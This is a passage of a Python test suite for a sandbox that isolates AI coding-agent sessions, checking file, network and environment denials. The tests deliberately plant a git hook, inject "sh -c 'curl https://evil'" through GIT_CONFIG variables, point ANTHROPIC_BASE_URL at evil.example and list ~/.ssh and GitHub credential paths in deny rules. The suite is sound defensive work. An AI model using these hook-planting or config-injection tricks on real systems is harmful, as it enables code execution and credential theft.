    assert str(run.root / ".git" / "config") in fs["denyWrite"]
    assert str(run.root) in fs["allowRead"]


def test_settings_deny_reads_for_holdouts_ssh_gh_and_other_runs(tmp_path: Path):
    run, root, settings = _make_run(tmp_path)
    deny = [str(Path(p).expanduser()) for p in settings["filesystem"]["denyRead"]]
    assert str(root / "holdouts") in deny
    assert str(Path("~/.ssh").expanduser()) in deny
    assert str(Path("~/.config/gh").expanduser()) in deny
    assert str(root / "runs") in deny  # other projects' (and siblings') runs


def test_settings_model_endpoint_accepts_a_url(tmp_path: Path):
    run = create_run("fixture", _fixture_repo(tmp_path), factory_root=_factory_root(tmp_path))
    settings = build_settings({}, run.root, model_endpoint="https://api.z.ai/api/anthropic")
    assert settings["network"]["allowedDomains"][0] == "api.z.ai"


def test_settings_credential_deny_covers_github_and_keychain_names(tmp_path: Path):
    run, _, settings = _make_run(tmp_path)
    denied = {e["name"] for e in settings["credentials"]["envVars"]}
    assert {"GH_TOKEN", "GITHUB_TOKEN", "JFO_PROBE_PASS"} <= denied


# --- clone manager -----------------------------------------------------------


def test_create_run_clones_with_blob_none_filter(tmp_path: Path):
    run, root, _ = _make_run(tmp_path)
    assert run.root == root / "runs" / "fixture" / run.run_id
    config = subprocess.run(
        [
            "git", "-C", str(run.root), "config", "--get-regexp",
            r"remote\.origin\.(promisor|partialclonefilter|url)",
        ],
        check=True, capture_output=True, text=True,
    ).stdout
    assert "remote.origin.promisor true" in config, config
    assert "remote.origin.partialclonefilter blob:none" in config, config
    assert (run.root / "README.md").exists()


def test_create_run_checkouts_named_ref(tmp_path: Path):
    source = _fixture_repo(tmp_path)
    (source / "feature.txt").write_text("feature\n")
    _git(source, "add", "-A")
    _git(source, "commit", "-m", "feature")
    _git(source, "branch", "feature-branch")
    run = create_run("fixture", source, factory_root=_factory_root(tmp_path), ref="feature-branch")
    assert (run.root / "feature.txt").exists()


def test_create_run_copies_the_warm_cache(tmp_path: Path):
    cache = tmp_path / "warm-cache"
    cache.mkdir()
    (cache / ".venv-marker").write_text("warm")
    run = create_run(
        "fixture",
        _fixture_repo(tmp_path),
        factory_root=_factory_root(tmp_path),
        warm_cache=cache,
    )
    assert (run.root / ".venv-marker").read_text() == "warm"


def test_run_ids_are_unique(tmp_path: Path):
    root = _factory_root(tmp_path)
    source = _fixture_repo(tmp_path)
    first = create_run("fixture", source, factory_root=root)
    second = create_run("fixture", source, factory_root=root)
    assert first.run_id != second.run_id
    assert first.root != second.root


def test_create_run_refuses_a_missing_source(tmp_path: Path):
    with pytest.raises(RunError, match="no-such-repo"):
        create_run("fixture", tmp_path / "no-such-repo", factory_root=_factory_root(tmp_path))


def test_cleanup_run_removes_everything_and_is_idempotent(tmp_path: Path):
    run, _, _ = _make_run(tmp_path)
    run.settings_path.parent.mkdir(parents=True, exist_ok=True)
    run.settings_path.write_text("{}")
    cleanup_run(run)
    assert not run.root.exists()
    assert not run.settings_path.exists()
    cleanup_run(run)  # second call must not raise


def test_scrub_env_strips_github_prefixes_and_forbidden_names():
    env = sandbox_env(
        Path("/tmp"),
        extra={
            "GH_TOKEN": "x", "GITHUB_TOKEN": "y", "GH_HOST": "z",
            "GITHUB_REPOSITORY": "r", "ANTHROPIC_AUTH_TOKEN": "keep-me",
        },
        forbidden=["SECRET_X"],
    )
    assert "GH_TOKEN" not in env and "GITHUB_TOKEN" not in env
    assert "GH_HOST" not in env and "GITHUB_REPOSITORY" not in env
    assert env["ANTHROPIC_AUTH_TOKEN"] == "keep-me"
    assert "PATH" in env and "HOME" in env


# --- review round: raw sockets, git-hook escapes, env allowlist, home reads ---


def test_direct_socket_to_non_allowlisted_ip_is_blocked(tmp_path: Path):
    """A process that ignores the proxy env vars and dials a raw IP must be
    blocked too — proxy filtering alone is not the boundary. 1.1.1.1:443 is
    a real, stable, non-allowlisted endpoint; the socket API cannot use the
    proxy, so this exercises the kernel-level network denial."""
    run, _, settings = _make_run(tmp_path)
    script = textwrap.dedent(
        """
        import socket, sys
        try:
            conn = socket.create_connection((sys.argv[1], 443), timeout=10)
            conn.close()
            print("direct:CONNECTED", flush=True)
        except Exception as exc:
            print(f"direct:BLOCKED {type(exc).__name__}: {exc}", flush=True)
        """
    )
    proc = run_sandboxed(
        _child(script, ["1.1.1.1"]), run.root, run.settings_path, timeout=60
    )
    assert "direct:BLOCKED" in proc.stdout, (
        f"raw socket to non-allowlisted 1.1.1.1:443 connected — proxy filtering "
        f"is the only network boundary\n{proc.stdout}{proc.stderr}"
    )


def test_git_hook_and_config_planting_is_denied_in_sandbox(tmp_path: Path):
    """A sandboxed process must not write .git/hooks or .git/config: hooks
    planted there execute later, OUTSIDE the sandbox, when the orchestrator
    commits and pushes with its own credentials."""
    run, _, settings = _make_run(tmp_path)
    script = textwrap.dedent(
        """
        import sys
        def attempt(label, fn):
            try:
                fn()
                print(f"{label}:ok", flush=True)
            except Exception as exc:
                print(f"{label}:denied {type(exc).__name__}", flush=True)
        hook, config = sys.argv[1], sys.argv[2]
        attempt("hook", lambda: open(hook, "w").write("#!/bin/sh\\ntouch /tmp/pwned\\n"))
        attempt("config", lambda: open(config, "a").write("[core] hooksPath = /tmp\\n"))
        attempt("commitmsg", lambda: open(sys.argv[3], "w").write("normal write"))
        """
    )
    commitmsg = run.root / ".git" / "COMMIT_EDITMSG"
    proc = run_sandboxed(
        _child(script, [str(run.root / ".git/hooks/pre-commit"),
                        str(run.root / ".git/config"),
                        str(commitmsg)]),
        run.root,
        run.settings_path,
        timeout=60,
    )
    outcomes = dict(line.split(":", 1) for line in proc.stdout.splitlines())
    assert outcomes["hook"].startswith("denied"), (
        f".git/hooks write allowed — a planted hook could fire outside the sandbox\n"
        f"{proc.stdout}{proc.stderr}"
    )
    assert outcomes["config"].startswith("denied"), (
        f".git/config write allowed — core.hooksPath could be redirected\n"
        f"{proc.stdout}{proc.stderr}"
    )
    assert outcomes["commitmsg"] == "ok", (
        f"normal .git writes are broken too — the denial is too broad\n{proc.stdout}{proc.stderr}"
    )


@pytestmark_nested
def test_planted_hook_never_fires_for_orchestrator_git(tmp_path: Path):
    """Even if a hook somehow gets planted (deny bypass, stale run), the
    orchestrator's own git commands must never execute it: every git call
    runs with hooks and fsmonitor disabled. The control proves the detector
    works by firing the hook with a plain git commit first."""
    from factory.runs import GIT_HARDENING

    run = create_run("fixture", _fixture_repo(tmp_path), factory_root=_factory_root(tmp_path))
    # Clones carry no git identity (local config doesn't propagate, and the
    # runner has no global one) — the orchestrator side sets it explicitly.
    _git(run.root, "config", "user.email", "orchestrator@factory.local")
    _git(run.root, "config", "user.name", "factory orchestrator")
    marker = tmp_path / "hook-ran"
    hook = run.root / ".git" / "hooks" / "pre-commit"
    hook.write_text(f"#!/bin/sh\ntouch '{marker}'\n")
    hook.chmod(0o755)

    (run.root / "one.txt").write_text("1\n")
    _git(run.root, "add", "-A")
    _git(run.root, "commit", "-m", "plain git — control")  # plain git DOES fire it
    assert marker.exists(), "control failed: the planted hook did not fire for plain git"
    marker.unlink()

    (run.root / "two.txt").write_text("2\n")
    _git(run.root, "add", "-A")
    subprocess.run(
        ["git", "-C", str(run.root), *GIT_HARDENING, "commit", "-m", "hardened"],
        check=True, capture_output=True, text=True,
    )
    assert not marker.exists(), (
        "the planted hook fired during an orchestrator git command — GIT_HARDENING "
        "must disable core.hooksPath and core.fsmonitor on every orchestrator-side git call"
    )


def test_provided_env_never_inherits_ambient_variables(tmp_path: Path, monkeypatch):
    """The allowlist applies on every path: an explicit env= overlay can pass
    deliberately chosen names, but nothing ambient leaks in from os.environ
    just because a caller supplied a dict."""
    run, _, settings = _make_run(tmp_path)
    monkeypatch.setenv("FACTORY_TEST_AMBIENT_SECRET", "ambient-leak")
    script = textwrap.dedent(
        """
        import os, sys
        for name in sys.argv[1:]:
            value = os.environ.get(name)
            print(f"{name}={value if value is not None else 'absent'}", flush=True)
        """
    )
    proc = run_sandboxed(
        _child(script, ["FACTORY_TEST_AMBIENT_SECRET", "API_TIMEOUT_MS"]),
        run.root,
        run.settings_path,
        env={"API_TIMEOUT_MS": "3000000"},
        timeout=60,
    )
    seen = dict(line.split("=", 1) for line in proc.stdout.splitlines())
    assert seen["FACTORY_TEST_AMBIENT_SECRET"] == "absent", (
        f"ambient os.environ variable crossed the sandbox via the env= path\n"
        f"{proc.stdout}{proc.stderr}"
    )
    assert seen["API_TIMEOUT_MS"] == "3000000", proc.stdout


def test_home_reads_are_denied(tmp_path: Path):
    """~ is denied for reads (the run dir is re-allowed): the WO's "other
    projects" plus everything else in the owner's home — ~/.aws, shell rc
    files, other checkouts — is none of a session's business."""
    # Pid-suffixed: under pytest-xdist each worker needs its own probe in the
    # real home — a fixed name lets one worker's unlink make another worker's
    # read fail for a reason that is not the one under test.
    probe = Path(f"~/.factory-sandbox-probe-{os.getpid()}").expanduser()
    probe.write_text("home secret\n")
    try:
        run, _, settings = _make_run(tmp_path)
        script = textwrap.dedent(
            """
            import sys
            def attempt(label, fn):
                try:
                    fn()
                    print(f"{label}:ok", flush=True)
                except Exception as exc:
                    print(f"{label}:denied {type(exc).__name__}", flush=True)
            attempt("home", lambda: open(sys.argv[1]).read())
            attempt("control", lambda: open(sys.argv[2]).read())
            """
        )
        proc = run_sandboxed(
            _child(script, [str(probe), "/etc/hosts"]),
            run.root,
            run.settings_path,
            timeout=60,
        )
        outcomes = dict(line.split(":", 1) for line in proc.stdout.splitlines())
        assert outcomes["home"].startswith("denied"), (
            f"a file in the owner's home was readable inside the sandbox\n"
            f"{proc.stdout}{proc.stderr}"
        )
        assert outcomes["control"] == "ok", (
            f"system reads are broken too — the denial is too broad\n{proc.stdout}{proc.stderr}"
        )
    finally:
        probe.unlink(missing_ok=True)


def test_settings_deny_git_control_paths_and_home(tmp_path: Path):
    run, _, settings = _make_run(tmp_path)
    deny_write = [str(Path(p)) for p in settings["filesystem"]["denyWrite"]]
    assert str(run.root / ".git" / "hooks") in deny_write
    assert str(run.root / ".git" / "config") in deny_write
    deny_read = [str(Path(p).expanduser()) for p in settings["filesystem"]["denyRead"]]
    assert str(Path("~").expanduser()) in deny_read


# --- review round 2: process groups, layout pinning, override gating, ---------- 
# --- lazy clones, warm-cache hygiene -------------------------------------------


def test_timeout_kills_the_whole_process_group(tmp_path: Path):
    """A wall-clock timeout must kill srt AND the shell/agent processes it
    spawned, or an aborted session keeps writing and calling the model while
    the next run starts. srt runs as a session leader, so killpg reaches the
    grandchildren; the heartbeat proves they died."""
    run, _, _ = _make_run(tmp_path)
    heartbeat = run.root / "heartbeat"
    script = textwrap.dedent(
        f"""
        import subprocess, time
        subprocess.Popen(
            ["/bin/sh", "-c", "while true; do echo x >> '{heartbeat}'; sleep 0.2; done"]
        )
        time.sleep(60)
        """
    )
    with pytest.raises(subprocess.TimeoutExpired):
        run_sandboxed(_child(script, []), run.root, run.settings_path, timeout=4)
    time.sleep(1.0)
    first = heartbeat.stat().st_size
    time.sleep(1.2)
    assert heartbeat.stat().st_size == first, (
        "the heartbeat kept growing after the timeout — sandboxed descendants "
        "survived the kill and are still running unsupervised"
    )


def test_build_settings_rejects_an_unrecognised_run_layout(tmp_path: Path):
    """The factory root must not be guessed silently: a run dir outside the
    canonical runs/<project>/<id> layout has to fail loudly (or get an
    explicit factory_root), or the holdouts deny would name a wrong path and
    the real one would stay readable."""
    odd = tmp_path / "not-runs" / "fixture" / "abc123"
    odd.mkdir(parents=True)
    with pytest.raises(SandboxError, match="factory_root"):
        build_settings({}, odd, model_endpoint=MODEL_ENDPOINT)
    settings = build_settings(
        {}, odd, model_endpoint=MODEL_ENDPOINT, factory_root=tmp_path
    )
    deny = [str(Path(p).expanduser()) for p in settings["filesystem"]["denyRead"]]
    assert str(tmp_path / "holdouts") in deny


def test_ensure_srt_caches_the_version_check(tmp_path: Path):
    """The pin check costs a Node boot; it must run once per binary state,
    not once per sandboxed command. The counting fake proves invocations."""
    calls = tmp_path / "calls"
    fake = tmp_path / "counting-srt"
    fake.write_text(f"#!/bin/sh\necho x >> '{calls}'\necho '{SRT_PIN}'\n")
    fake.chmod(0o755)
    ensure_srt(srt_bin_path=fake)
    ensure_srt(srt_bin_path=fake)
    ensure_srt(srt_bin_path=fake)
    assert calls.read_text().count("x") == 1


def test_clone_is_actually_partial(tmp_path: Path):
    """--filter=blob:none must be honoured by the local file:// server (it
    needs uploadpack.allowFilter), not just recorded in the config: the
    other branch's file blob must be MISSING from the clone."""
    source = _fixture_repo(tmp_path)
    _git(source, "checkout", "-b", "other-branch")
    (source / "other.txt").write_text("other branch\n")
    _git(source, "add", "-A")
    _git(source, "commit", "-m", "other branch")
    _git(source, "checkout", "main")

    run = create_run("fixture", source, factory_root=_factory_root(tmp_path))
    listing = subprocess.run(
        ["git", "-C", str(run.root), "cat-file", "--batch-all-objects", "--batch-check"],
        check=True, capture_output=True, text=True,
    ).stdout
    present = {line.split()[0] for line in listing.splitlines() if line.split()[1] == "blob"}

    def blob_sha(rev: str, path: str) -> str:
        return subprocess.run(
            ["git", "-C", str(run.root), "rev-parse", f"{rev}:{path}"],
            check=True, capture_output=True, text=True,
        ).stdout.strip()

    assert blob_sha("HEAD", "README.md") in present, "checked-out blob missing?!"
    assert blob_sha("origin/other-branch", "other.txt") not in present, (
        "the clone is fully materialised — the blob filter was ignored by the "
        "local server and every run pays a full clone"
    )


def test_warm_cache_is_relocated_and_excluded_from_commits(tmp_path: Path):
    """A copied venv carries absolute paths from the cache (shebangs,
    pyvenv.cfg); they are rewritten to the run dir. Cache entries also go
    into .git/info/exclude so a session's `git add -A` can't commit them,
    and .git/info joins the sandbox's denied writes so the agent can't undo
    the excludes."""
    cache = tmp_path / "warm-cache"
    (cache / "node_modules").mkdir(parents=True)
    (cache / "node_modules" / "lib.js").write_text("module.exports = 1\n")
    venv_bin = cache / ".venv" / "bin"
    venv_bin.mkdir(parents=True)
    (venv_bin / "pip").write_text(f"#!{cache}/.venv/bin/python\n# -*- coding: utf-8 -*-\n")
    (venv_bin / "activate").write_text(f"VIRTUAL_ENV='{cache}/.venv'\n")
    (cache / ".venv" / "pyvenv.cfg").write_text(f"home = {cache}/base\n")

    run = create_run(
        "fixture", _fixture_repo(tmp_path), factory_root=_factory_root(tmp_path),
        warm_cache=cache,
    )
    assert (run.root / ".venv" / "bin" / "pip").read_text().startswith(
        f"#!{run.root}/.venv/bin/python"
    ), "shebang still points into the warm cache"
    activate = (run.root / ".venv" / "bin" / "activate").read_text()
    assert f"VIRTUAL_ENV='{run.root}/.venv'" in activate
    exclude = (run.root / ".git" / "info" / "exclude").read_text()
    assert ".venv/" in exclude and "node_modules/" in exclude, (
        f"warm-cache entries not excluded: {exclude!r}"
    )

    settings = build_settings({}, run.root, model_endpoint=MODEL_ENDPOINT)
    deny_write = [str(Path(p)) for p in settings["filesystem"]["denyWrite"]]
    assert str(run.root / ".git" / "info") in deny_write


def test_sibling_run_reads_are_denied(tmp_path: Path):
    """Other projects' (and sibling) runs are unreadable — the WO's "other
    projects" clause, proven by an attempt on a real sibling run."""
    source = _fixture_repo(tmp_path)
    root = _factory_root(tmp_path)
    first = create_run("project-a", source, factory_root=root)
    second = create_run("project-b", source, factory_root=root)
    (first.root / "sibling-secret.txt").write_text("other project's data\n")
    for run in (first, second):
        write_settings(
            build_settings({}, run.root, model_endpoint=MODEL_ENDPOINT),
            run.settings_path,
        )
    script = textwrap.dedent(
        """
        import sys
        try:
            open(sys.argv[1]).read()
            print("sibling:ok", flush=True)
        except Exception as exc:
            print(f"sibling:denied {type(exc).__name__}", flush=True)
        """
    )
    proc = run_sandboxed(
        _child(script, [str(first.root / "sibling-secret.txt")]),
        second.root,
        second.settings_path,
        timeout=60,
    )
    assert proc.stdout.startswith("sibling:denied"), (
        f"a sibling project's run was readable inside the sandbox\n"
        f"{proc.stdout}{proc.stderr}"
    )


# --- review round 3: env allowlist for real, toolchain access, HOME scratch, ---
# --- bounded teardown, anchored excludes, venv edge cases --------------------


def test_env_dict_of_os_environ_is_allowlisted(tmp_path: Path, monkeypatch):
    """The scenario the finding describes: F-06 passes {**os.environ, token}.
    A planted ambient secret must NOT cross; the deliberate session names
    must. Nothing about this is satisfied by 'the caller chose the dict' —
    os.environ IS a dict the caller can pass."""
    run, _, _ = _make_run(tmp_path)
    monkeypatch.setenv("FAKE_AWS_SECRET", "leak123")
    # AWS_SECRET_ACCESS_KEY may be the host's real key: the probe redacts
    # every value this test did not plant.
    script = _env_probe({"leak123", "zai-token", "3000000"})
    names = ["FAKE_AWS_SECRET", "AWS_SECRET_ACCESS_KEY", "ANTHROPIC_AUTH_TOKEN",
             "API_TIMEOUT_MS"]
    proc = run_sandboxed(
        _child(script, names),
        run.root,
        run.settings_path,
        env={**os.environ, "ANTHROPIC_AUTH_TOKEN": "zai-token",
             "API_TIMEOUT_MS": "3000000"},
        timeout=60,
    )
    seen = dict(line.split("=", 1) for line in proc.stdout.splitlines())
    assert seen["FAKE_AWS_SECRET"] == "absent", (
        f"ambient secret crossed via env=dict(os.environ)\n{proc.stdout}{proc.stderr}"
    )
    assert seen["AWS_SECRET_ACCESS_KEY"] == "absent", proc.stdout
    assert seen["ANTHROPIC_AUTH_TOKEN"] == "zai-token", proc.stdout
    assert seen["API_TIMEOUT_MS"] == "3000000", proc.stdout


def test_toolchain_under_home_is_executable(tmp_path: Path, monkeypatch):
    """F-06 runs the Claude Code CLI, which may live under $HOME
    (~/.local/bin/claude, pyenv, uv, nvm). The home-wide denyRead must not
    make the session's own toolchain unexecutable: build_settings re-allows
    the resolved toolchain paths (binary dir, its sibling lib/ when the
    dir is a bin/, and the literal symlinks on the way — never ancestors).

    HOME is a per-test fake: the deny/allow scheme keys on HOME at
    build_settings time (see the symlinked-home test below), and a fixed
    tool root under the real home would race parallel workers (pytest-xdist).
    tmp_path owns the cleanup."""
    home = tmp_path / "home"
    tool_bin = home / ".factory-sandbox-toolchain-test" / "bin"
    tool_bin.mkdir(parents=True)
    claude = tool_bin / "claude"
    claude.write_text("#!/bin/sh\necho 'claude 2.0.0 (toolchain ok)'\n")
    claude.chmod(0o755)
    run, _, _ = _make_run(tmp_path)
    monkeypatch.setenv("HOME", str(home))
    settings = build_settings(
        {}, run.root, model_endpoint=MODEL_ENDPOINT, toolchain=[claude]
    )
    write_settings(settings, run.settings_path)
    proc = run_sandboxed(
        [str(claude), "--version"], run.root, run.settings_path, timeout=60
    )
    assert "toolchain ok" in proc.stdout, (
        f"toolchain binary under $HOME could not run: rc={proc.returncode}\n"
        f"{proc.stdout}{proc.stderr}"
    )


def test_home_is_a_writable_scratch_inside_the_run(tmp_path: Path):
    """HOME points at <run>/.home, not the (now unreadable) real home: pip,
    npm, git and Claude Code all want a HOME they can read and write."""
    run, _, _ = _make_run(tmp_path)
    script = textwrap.dedent(
        """
        import os, pathlib
        home = pathlib.Path(os.environ["HOME"])
        print(f"HOME={home}", flush=True)
        (home / ".cache").mkdir(parents=True, exist_ok=True)
        (home / ".cache" / "probe").write_text("ok")
        print(f"cache=ok", flush=True)
        """
    )
    proc = run_sandboxed(
        _child(script, []), run.root, run.settings_path, timeout=60
    )
    assert proc.stdout.splitlines()[0] == f"HOME={run.root / '.home'}", (
        f"HOME is not the run scratch dir\n{proc.stdout}{proc.stderr}"
    )
    assert "cache=ok" in proc.stdout, proc.stdout


def test_background_child_does_not_stall_the_return(tmp_path: Path):
    """A session that leaves `npm run dev &` behind must not hold the
    orchestrator: once the leader exits, the group is killed and the return
    is bounded even though the background child inherited the pipes."""
    run, _, _ = _make_run(tmp_path)
    script = textwrap.dedent(
        """
        import subprocess, sys
        subprocess.Popen([sys.executable, "-c", "import time; time.sleep(30)"])
        print("leader done", flush=True)
        """
    )
    started = time.monotonic()
    proc = run_sandboxed(_child(script, []), run.root, run.settings_path, timeout=60)
    elapsed = time.monotonic() - started
    assert "leader done" in proc.stdout
    assert elapsed < 25, (
        f"run_sandboxed took {elapsed:.1f}s to return after the leader exited — "
        "a background child is holding the pipes"
    )


def test_timeout_stays_bounded_against_a_detached_process(tmp_path: Path):
    """A process that escapes the process group (setsid) survives killpg and
    holds the pipes. The timeout must still return in bounded time (drain
    grace + forced pipe close), not wait for the escapee."""
    run, _, _ = _make_run(tmp_path)
    script = textwrap.dedent(
        """
        import subprocess, sys, time
        subprocess.Popen(
            [sys.executable, "-c", "import time; time.sleep(60)"],
            start_new_session=True,
        )
        time.sleep(60)
        """
    )
    started = time.monotonic()
    with pytest.raises(subprocess.TimeoutExpired):
        run_sandboxed(_child(script, []), run.root, run.settings_path, timeout=3)
    elapsed = time.monotonic() - started
    assert elapsed < 25, (
        f"TimeoutExpired took {elapsed:.1f}s to propagate — a detached child "
        "held the pipes past the drain grace"
    )


def test_srt_bin_ignores_env_overrides_entirely(monkeypatch):
    """No env var can redirect the sandbox binary in production: the override
    mechanism is gone; tests inject via the srt_bin_path parameter. The
    expected path is anchored to the imported factory package itself, so the
    test holds in whichever checkout actually supplies the code under test
    (the conftest guard refuses a suite run against any other checkout)."""
    import factory.sandbox
    from factory.sandbox import srt_bin as srt_bin_fn

    monkeypatch.setenv("FACTORY_SRT_BIN", "/tmp/definitely-not-srt")
    resolved = srt_bin_fn()
    assert resolved != Path("/tmp/definitely-not-srt")
    package_root = Path(factory.sandbox.__file__).resolve().parent.parent
    assert resolved == package_root / "node_modules" / ".bin" / "srt"


def test_run_sandboxed_takes_an_injected_srt_binary(tmp_path: Path):
    """The parameter is the only injection path (and still pin-checked)."""
    run, _, _ = _make_run(tmp_path)
    fake = _fake_srt(tmp_path, "0.0.78")
    with pytest.raises(SandboxError, match="0.0.78"):
        run_sandboxed(
            ["true"], run.root, run.settings_path, srt_bin_path=fake
        )
    assert not (run.root / "true-ran").exists()


def test_cache_excludes_are_anchored_to_the_run_root(tmp_path: Path):
    """A cache entry named `lib` must not ignore src/lib anywhere in the
    repo — unanchored excludes would hide agent-written files from
    `git add -A` and ship an incomplete PR."""
    cache = tmp_path / "warm-cache"
    (cache / "lib").mkdir(parents=True)
    (cache / "lib" / "cached.so").write_text("cache")
    run = create_run(
        "fixture", _fixture_repo(tmp_path), factory_root=_factory_root(tmp_path),
        warm_cache=cache,
    )
    nested = run.root / "src" / "lib" / "new_module.py"
    nested.parent.mkdir(parents=True)
    nested.write_text("agent code\n")
    ignored = subprocess.run(
        ["git", "-C", str(run.root), "check-ignore", "-q", "src/lib/new_module.py"],
        capture_output=True,
    )
    assert ignored.returncode == 1, (
        "src/lib/new_module.py is ignored by an unanchored cache exclude"
    )
    root_ignored = subprocess.run(
        ["git", "-C", str(run.root), "check-ignore", "-q", "lib/cached.so"],
        capture_output=True,
    )
    assert root_ignored.returncode == 0, "the cache's own lib/ is not excluded"


def test_venv_relocation_handles_symlinked_cache_paths(tmp_path: Path):
    """A cache reached via a symlink embeds the *given* path in shebangs
    (/tmp vs /private/tmp on macOS); rewriting only the resolved path is a
    silent no-op. Both forms must be rewritten."""
    real = tmp_path / "real-cache"
    venv_bin = real / ".venv" / "bin"
    venv_bin.mkdir(parents=True)
    (venv_bin / "pip").write_text("")  # filled below with the linked path
    (real / ".venv" / "pyvenv.cfg").write_text("")

    link = tmp_path / "linked-cache"
    os.symlink(real, link)
    (venv_bin / "pip").write_text(f"#!{link}/.venv/bin/python\n")

    run = create_run(
        "fixture", _fixture_repo(tmp_path), factory_root=_factory_root(tmp_path),
        warm_cache=link,
    )
    assert (run.root / ".venv" / "bin" / "pip").read_text().startswith(
        f"#!{run.root}/.venv/bin/python"
    ), "shebang written through the symlinked path was not relocated"


def test_warm_cache_refuses_tracked_file_collisions(tmp_path: Path):
    """A cache entry that would overwrite a tracked file (package-lock.json,
    requirements.txt) must refuse, not silently mutate the checkout the
    agent is supposed to diff against."""
    cache = tmp_path / "warm-cache"
    cache.mkdir()
    (cache / "README.md").write_text("cache content, not the repo's\n")
    with pytest.raises(RunError, match="README.md"):
        create_run(
            "fixture", _fixture_repo(tmp_path), factory_root=_factory_root(tmp_path),
            warm_cache=cache,
        )


# --- review round 4: pipe pumping, ambient seats, toolchain scope, excludes ---


def test_large_output_does_not_deadlock(tmp_path: Path):
    """proc.wait() with PIPEd stdout deadlocks once the child writes past the
    pipe buffer (~64KB): nothing drains the pipes while the leader runs. A
    300KB write must finish fast, not eat the whole wall clock."""
    run, _, _ = _make_run(tmp_path)
    script = "import sys\nsys.stdout.write('x' * 300000)\nprint()"
    started = time.monotonic()
    proc = run_sandboxed(
        [sys.executable, "-c", script], run.root, run.settings_path, timeout=20
    )
    elapsed = time.monotonic() - started
    assert len(proc.stdout.strip()) == 300000, (
        f"output truncated or lost: {len(proc.stdout)} bytes\n{proc.stderr[-300:]}"
    )
    assert elapsed < 10, (
        f"took {elapsed:.1f}s for a sub-second command — pipe deadlock"
    )


def test_ambient_seat_and_git_config_names_do_not_cross(tmp_path: Path, monkeypatch):
    """The orchestrator's own ANTHROPIC_* keys and any GIT_CONFIG_* must not
    enter a session by ambient inheritance (a real Anthropic key reaching a
    Z.ai seat; exec-capable git config riding in). Seat names are taken ONLY
    from the explicit env=; GIT_CONFIG_* is not taken at all."""
    run, _, _ = _make_run(tmp_path)
    monkeypatch.setenv("ANTHROPIC_API_KEY", "ambient-real-key")
    monkeypatch.setenv("ANTHROPIC_AUTH_TOKEN", "ambient-override-token")
    monkeypatch.setenv("ANTHROPIC_BASE_URL", "https://evil.example")
    monkeypatch.setenv("GIT_CONFIG_COUNT", "1")
    monkeypatch.setenv("GIT_CONFIG_KEY_0", "core.sshCommand")
    monkeypatch.setenv("GIT_CONFIG_VALUE_0", "sh -c 'curl https://evil'")
    # ANTHROPIC_AUTH_TOKEN itself is asserted positively below: the explicit
    # env= is its only source and must win over the ambient monkeypatched one.
    names = [
        "ANTHROPIC_API_KEY", "ANTHROPIC_BASE_URL",
        "GIT_CONFIG_COUNT", "GIT_CONFIG_KEY_0", "GIT_CONFIG_VALUE_0",
    ]
    script = textwrap.dedent(
        """
        import os, sys
        for name in sys.argv[1:]:
            value = os.environ.get(name)
            print(f"{name}={value if value is not None else 'absent'}", flush=True)
        """
    )
    proc = run_sandboxed(
        _child(script, names + ["PATH", "ANTHROPIC_AUTH_TOKEN"]),
        run.root,
        run.settings_path,
        env={"ANTHROPIC_AUTH_TOKEN": "deliberate"},
        timeout=60,
    )
    seen = dict(line.split("=", 1) for line in proc.stdout.splitlines())
    for name in names:
        assert seen[name] == "absent", (
            f"ambient {name} crossed into the session\n{proc.stdout}{proc.stderr}"
        )
    assert seen["PATH"], "PATH must still be inherited"
    assert seen["ANTHROPIC_AUTH_TOKEN"] == "deliberate", (
        "the explicit env= is the only source for seat names, and it must "
        "win over the ambient value"
    )


def test_toolchain_allowread_is_install_dir_only():
    """Only the resolved install dir is re-allowed (plus the sibling lib/
    when the binary sits in a bin/), never the ancestors: re-allowing the
    chain re-opens ~/.local and ~/.local/share — uv's credential store,
    cursor-agent, Copilot shims and friends live there.

    A pure function of its arguments: no seatbelt involved, so not gated
    on the nesting probe (review of #57). Entries come back resolved, so
    the expectation is spelled against the resolved home."""
    home = Path.home()
    base = home / ".factory-sandbox-tc-r4"
    real = home.resolve() / ".factory-sandbox-tc-r4"
    claude = base / "share" / "claude" / "versions" / "X" / "claude"
    assert _toolchain_allowread(home, [claude]) == {
        real / "share" / "claude" / "versions" / "X"
    }
    python = base / "pyenv" / "versions" / "3.12" / "bin" / "python"
    assert _toolchain_allowread(home, [python]) == {
        real / "pyenv" / "versions" / "3.12" / "bin",
        real / "pyenv" / "versions" / "3.12" / "lib",  # stdlib + site-packages
    }


def test_toolchain_allowread_survives_a_symlinked_home(tmp_path: Path, monkeypatch):
    """HOME with a symlink component (macOS /tmp and /var -> /private, a
    nested HOME, /home on another volume): the binary path is resolved,
    so the home it is compared against must be too — otherwise nothing
    is "below home", no toolchain read is emitted, and the home-wide
    denyRead leaves the session's own toolchain unexecutable."""
    real_home = tmp_path / "real-home"
    (real_home / ".local" / "bin").mkdir(parents=True)
    link_home = tmp_path / "link-home"
    link_home.symlink_to(real_home)
    tool = link_home / ".local" / "bin" / "sometool"
    tool.write_text("#!/bin/sh\n")
    real = real_home.resolve()
    assert _toolchain_allowread(link_home, [tool]) == {
        real / ".local" / "bin", real / ".local" / "lib"
    }

    run, _root, _settings = _make_run(tmp_path)
    monkeypatch.setenv("HOME", str(link_home))
    settings = build_settings(
        {"docs_allowlist": [], "network_allowlist": []},
        run.root,
        model_endpoint=MODEL_ENDPOINT,
        toolchain=[tool],
    )
    allow = settings["filesystem"]["allowRead"]
    assert str(real / ".local" / "bin") in allow, allow


def test_toolchain_bin_dir_under_home_still_executes(tmp_path: Path, monkeypatch):
    """The narrowed toolchain reads must still let a binary under $HOME run:
    the round-3 exec fix has to survive its own scope reduction.

    HOME is a per-test fake (see test_toolchain_under_home_is_executable):
    same deny/allow semantics, no fixed path in the real home to race
    parallel workers."""
    home = tmp_path / "home"
    tool_bin = home / ".factory-sandbox-toolchain-r4" / "bin"
    tool_bin.mkdir(parents=True)
    probe = tool_bin / "probe"
    probe.write_text("#!/bin/sh\necho 'r4 toolchain ok'\n")
    probe.chmod(0o755)
    run, _, _ = _make_run(tmp_path)
    monkeypatch.setenv("HOME", str(home))
    settings = build_settings({}, run.root, model_endpoint=MODEL_ENDPOINT,
                              toolchain=[probe])
    write_settings(settings, run.settings_path)
    proc = run_sandboxed([str(probe)], run.root, run.settings_path, timeout=60)
    assert "r4 toolchain ok" in proc.stdout, (
        f"rc={proc.returncode}\n{proc.stdout}{proc.stderr}"
    )


def test_home_and_tmp_scratch_are_git_excluded(tmp_path: Path):
    """<run>/.home and <run>/.tmp are scratch: pip/npm caches and Claude Code
    session state land there, and none of it may show up as untracked (an
    agent's `git add -A` would commit caches and transcripts into the PR)."""
